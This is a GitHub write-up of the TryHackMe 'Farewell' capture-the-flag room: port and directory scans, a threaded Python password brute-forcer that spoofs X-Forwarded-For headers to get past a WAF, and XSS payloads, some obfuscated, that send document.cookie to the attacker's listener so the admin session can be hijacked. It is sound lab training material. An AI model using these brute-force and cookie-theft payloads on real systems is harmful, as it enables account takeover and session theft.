
<img width="1894" height="394" alt="image" src="https://github.com/user-attachments/assets/761637ad-7549-461a-80ae-c927f2c84f7b" />


```bash
:~# nmap -sT -p- -T4 xx.xx.xxx.xx
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
:~# nmap -sC -sV -Pn  -p22,80 -T4 xx.xx.xxx.xx
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Farewell \xE2\x80\x94 Login
```

```bash
:~# nikto -h http://xx.xx.xxx.xx
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          xx.xx.xxx.xx
+ Target Hostname:    xx.xx.xxx.xx
+ Target Port:        80
+ Start Time:         2025-11-23 xx:xx:xx (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.58 (Ubuntu)
+ Cookie PHPSESSID created without the httponly flag
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ Server leaks inodes via ETags, header found with file /modules.php?op=modload&name=FAQ&file=index&myfaq=yes&id_cat=1&categories=%3Cimg%20src=javascript:alert(9456);%3E&parent_id=0, fields: 0x30c 0x642adc362923c 
+ OSVDB-29786: /admin.php?en_log_id=0&action=config: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.
+ OSVDB-29786: /admin.php?en_log_id=0&action=users: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.
+ OSVDB-3092: /admin.php: This might be interesting...
+ OSVDB-3233: /info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ OSVDB-5292: /info.php?file=http://cirt.net/rfiinc.txt?: RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/
+ 6544 items checked: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2025-11-23 xx:xx:xx (GMT0) (7 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

```bash
:~# gobuster dir -u http://xx.xx.xxx.xx/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,js
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://xx.xx.xxx.xx/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 780]
/index.php            (Status: 200) [Size: 5246]
/info.php             (Status: 200) [Size: 87579]
/admin.php            (Status: 403) [Size: 780]
/status.php           (Status: 200) [Size: 3467]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/check.js             (Status: 200) [Size: 2027]
/auth.php             (Status: 403) [Size: 780]
/dashboard.php        (Status: 302) [Size: 0] [--> /]
/server-status        (Status: 403) [Size: 780]
Progress: 654825 / 654828 (100.00%)
===============================================================
Finished
===============================================================
```

```bash
:~# dirsearch -u http://xx.xx.xxx.xx/
...
[xx:xx:xx] 200 -    1KB - /admin.php
[xx:xx:xx] 405 -   30B  - /auth.php
[xx:xx:xx] 302 -    0B  - /dashboard.php  ->  /
[xx:xx:xx] 200 -   24KB - /info.php
[xx:xx:xx] 301 -  317B  - /javascript  ->  http://xx.xx.xxx.xx/javascript/
[xx:xx:xx] 302 -    0B  - /logout.php  ->  index.php
[xx:xx:xx] 403 -  780B  - /server-status
[xx:xx:xx] 403 -  780B  - /server-status/
[xx:xx:xx] 200 -    1KB - /status.php

Task Completed
```

```bash
:~# curl http://xx.xx.xxx.xx/javascript/
...
<title>403 Forbidden</title>
...
  <p>Sorry, you don\u2019t have permission to access this page. WAF is Active</p>
```

```bash
:~# curl http://xx.xx.xxx.xx/index.php
```


<p><em>by Jaxafed</em></p>

```bash
import requests
import random
import concurrent.futures

URL = "http://xx.xx.xxx.xx/auth.php"

def worker(digits):
    xfwd = ".".join(str(random.randint(1, 255)) for _ in range(4))
    data = {
        "username": "deliver11",
        "password": f"Tokyo{digits}",
    }
    try:
        r = requests.post(
            URL,
            headers={"X-Forwarded-For": xfwd, "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"},
            data=data,
        )
    except Exception:
        return None

    if b"auth_failed" not in r.content:
        return digits

    return None


if __name__ == "__main__":

    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        futures = [executor.submit(worker, f"{digits:04}") for digits in range(0, 10000)]
        try:
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result is not None:
                    print(f"[+] VALID DIGITS FOUND: {result}")
                    executor.shutdown(wait=False, cancel_futures=True)
                    break
                    
        except KeyboardInterrupt:
            print("\n[!] Interrupted by user")
            executor.shutdown(wait=False, cancel_futures=True)
```

```bash
:~#  python3 s.py
```

<p>

- authenticate : <strong>deliver11</code> : <strong>Tokyo....</strong><br>
- identify flag 1</p>


<img width="918" height="622" alt="image" src="https://github.com/user-attachments/assets/d6c9e0d6-959f-49ed-b4cd-e6666552c71b" />

<br>
<br>
<p>

- remember from Nikto: <strong>Server leaks inodes via ETags, header found with file /modules.php?op=modload&name=FAQ&file=index&myfaq=yes&id_cat=1&categories=%3Cimg%20src=javascript:alert(9456);%3E&parent_id=0, fields: 0x30c 0x642adc362923c </strong><br></p>

```bash
"<img src=x oneoerror=eval("fetch('http://xx.xx.xxx.xx:8000/?c='+document.cookie)") >"
```

```bash
"<img src=x oneoerror=eval("ZmV0Y2goJ2h0dHA6Ly94eC54eC54eHgueHg6ODAwMC8/Yz0nK2RvY3VtZW50LmNvb2tpZSk=") >"
```

<br>

```bash
"<IMG src=x onerror=eval("fet"+"ch('http://xx.xx.xxx.xx:8000/?c='+document.coo"+"kie)") >"
```

```bash
:~# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
xx.xx.xxx.xx - - [23/Nov/2025 xx:xx:xx] "GET /?c=PHPSESSID=.......................... HTTP/1.1" 200 -
xx.xx.xxx.xx - - [23/Nov/2025 xx:xx:xx] "GET /?c=PHPSESSID=..........................i HTTP/1.1" 200 -
```

<br>
<p>

- substitute deliver11´s cookie by admin´s<br>
- refresh</p>

<img width="939" height="305" alt="image" src="https://github.com/user-attachments/assets/165a69dc-65a0-4dca-9b08-26af6862bc2a" />

<br>
<br>
<p>
  
- identify the second flag by navigating to /admin.php?en_log_id=0&action=config</p>

<img width="945" height="462" alt="image" src="https://github.com/user-attachments/assets/6822dc3f-9556-48e8-8c34-6f23be6d156e" />


<br>
<br>
<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/fd63609f-c8d9-45c1-87e0-50238a403352"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/c3c48116-bf9c-47e7-9cde-2b890a1f3436"></p>

<h1 align="center">My TryHackMe Journey ・ 2025, November</h1>

<div align="center"><h6>

| Date   | Room                                  |Streak   |All Time<br>Global|All Time<br>Brazil|Monthly<br>Global|Monthly<br>Brazil|Points|Rooms<br>Completed|Badges|
|:------:|:--------------------------------------|--------:|------------:|------------:|------------:|------------:|------------:|------------:|------------:|
|23      |Medium 🚩 - Farewell                   |   2    |      91ˢᵗ    |     3ʳᵈ    |     532ⁿᵈ   |      6ᵗʰ     |    133,762  |    1,032    |    80     |
|23      |Medium 🔗 - WAF: Exploitation Techniques|  2    |      92ⁿᵈ    |     3ʳᵈ    |     516ᵗʰ   |      6ᵗʰ     |    133,826  |    1,031    |    80     |
|22      |Hard 🚩 - The Last Trial               |   1    |      91ˢᵗ    |     3ʳᵈ    |     532ⁿᵈ   |      6ᵗʰ     |    133,762  |    1,030    |    80     |
|22      |Medium 🔗 - Data Integrity & Model Poisoning|   1|     94ᵗʰ    |     3ʳᵈ    |     762ⁿᵈ   |      7ᵗʰ     |    133,492  |    1,029    |    80     |
|22      |Easy 🔗 - LLM Output Handling and Privacy Risks|   1|  94ᵗʰ    |     3ʳᵈ    |     809ᵗʰ   |      7ᵗʰ     |    133,444  |    1,028    |    80     |
|22      |Easy 🔗 - Advent of Cyber Prep Track   |   1    |      94ᵗʰ    |     3ʳᵈ    |     826ᵗʰ   |      8ᵗʰ     |    133,428  |    1,027    |    80     |
|19      |Easy 🔗 - WAF: Introduction            |   2    |      91ˢᵗ    |     3ʳᵈ    |     737ᵗʰ   |      7ᵗʰ     |    133,348  |    1,026    |    80     |
|19      |Easy 🔗 - Django: CVE-2025-64459       |   2    |      93ʳᵈ    |     3ʳᵈ    |     877ᵗʰ   |      8ᵗʰ     |    133,224  |    1,025    |    80     |
|19      |Easy 🔗 - Django: CVE-2025-64459       |   2    |      93ʳᵈ    |     3ʳᵈ    |     877ᵗʰ   |      8ᵗʰ     |    133,224  |    1,025    |    80     |
|18      |Easy 🔗 - OWASP Top 10 2025: Insecure Data Handling| 1        |      93ʳᵈ    |     3ʳᵈ    |     894ᵗʰ   |      8ᵗʰ     |    132,207  |    1,024    |    80     |
|18      |Easy 🔗 - OWASP Top 10 2025: Application Design Failures| 1   |      93ʳᵈ    |     3ʳᵈ    |     927ᵗʰ   |      8ᵗʰ     |    132,183  |    1,023    |    80     |
|18      |Easy 🔗 - OWASP Top 10 2025: IAAA Failures| 1   |      93ʳᵈ    |     3ʳᵈ    |     971ˢᵗ   |      8ᵗʰ     |    132,151  |    1,022    |    80     |
|14      |Hard 🚩 - Shock and Silence            |   1    |      94ᵗʰ    |     4ᵗʰ    |     749ᵗʰ   |      7ᵗʰ     |    133,095  |    1,021    |    80     |
|14      |Easy 🔗 - Input Manipulation & Prompt Injection| 1 |   95ᵗʰ    |     4ᵗʰ    |   1,290ᵗʰ   |     12ⁿᵈ     |    132,822  |    1,020    |    80     |
|14      |Hard 🚩 - CRM Snatch                   |   1    |      95ᵗʰ    |     4ᵗʰ    |   1,526ᵗʰ   |     12ⁿᵈ     |          -  |    1,019    |    80     |
|8       |Easy 🔗 - Living of the Land Attacks   |   1    |      91ˢᵗ    |     4ᵗʰ    |   1,759ᵗʰ   |     17ᵗʰ     |    132,642  |    1,018    |    80     |
|8       |Hard 🚩 - Lost in RAMslation           |   1    |      91ˢᵗ    |     4ᵗʰ    |   2,547ᵗʰ   |     25ᵗʰ     |    132,580  |    1,017    |    80     |
|8       |Easy 🔗 - MITRE                        |   1    |       -      |     4ᵗʰ    |      -      |      -       |          -  |       -     |    80     |

</h6></div><br>

<p align="center">Global All Time:     92ⁿᵈ<br><img width="250px" src="https://github.com/user-attachments/assets/0edeb95e-0a6a-4319-a558-0c8cc84f9a53"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/63447458-dcf5-47b0-967f-8ecbcc5ccb31"><br><br>
                  Brazil All Time:      3ʳᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/57c27ce2-cad1-4d4a-99ed-60c2730a4d1f"><br><br>
                  Global monthly:     516ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/84bce336-37b3-41d1-9db6-adf941adfe8d"><br><br>
                  Brazil monthly:       6ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/7d9eda94-7ec2-4adf-a217-5c3be82bdb73"></p>


<h1 align="center">Thanks for coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>









<img width="1086" height="132" alt="image" src="https://github.com/user-attachments/assets/5fdaebd5-0842-44e0-864b-5e3bb198e42a" />

<img width="1113" height="483" alt="image" src="https://github.com/user-attachments/assets/2bab2b5c-a249-401b-9290-89e328610698" />




<img width="1128" height="515" alt="image" src="https://github.com/user-attachments/assets/21e589b6-4173-4b3e-a427-4e05b9f267b7" />

<img width="1120" height="498" alt="image" src="https://github.com/user-attachments/assets/3ac77bf1-dcfd-44fc-a8bd-a8db33f919d7" />

<img width="1134" height="393" alt="image" src="https://github.com/user-attachments/assets/dab9cddd-29f6-4c9f-ac9d-32fd7dd8234d" />


<img width="1014" height="265" alt="image" src="https://github.com/user-attachments/assets/438d7b78-bb88-4eb1-a269-fb7cc1d1024d" />

<img width="1013" height="299" alt="image" src="https://github.com/user-attachments/assets/5bf0964e-44c6-43be-ad13-5818d7eea799" />

<img width="1120" height="386" alt="image" src="https://github.com/user-attachments/assets/bba232f8-83c0-46c5-94b3-5b23d727a757" />

"password_hint":"the year plus a kind send-off"

<img width="759" height="37" alt="image" src="https://github.com/user-attachments/assets/e95c5718-79e3-4724-b9e6-b5ff0ab39278" />

<code>adam</code><br>
password_hint":"favorite pet + 2"

<img width="1017" height="272" alt="image" src="https://github.com/user-attachments/assets/52326d8f-a8d3-4f09-b4e8-8e154e072dee" />

<code>nora</code><br>
"password_hint":"lucky number 789"

<img width="1017" height="241" alt="image" src="https://github.com/user-attachments/assets/88558de6-5f66-45a6-98c1-ce7c3f13d5eb" />

<code>deliver11</code><br>
"password_hint":"Capital of Japan followed by 4 digits"

<img width="1014" height="244" alt="image" src="https://github.com/user-attachments/assets/92db1ef0-d0c4-4520-b0cb-2964c805f943" />

:~# seq -f "Tokyo%04g" 0 9999 > wordlist

:~# head -n 5 wordlist
Tokyo0000
Tokyo0001
Tokyo0002
Tokyo0003
Tokyo0004






```bash

```




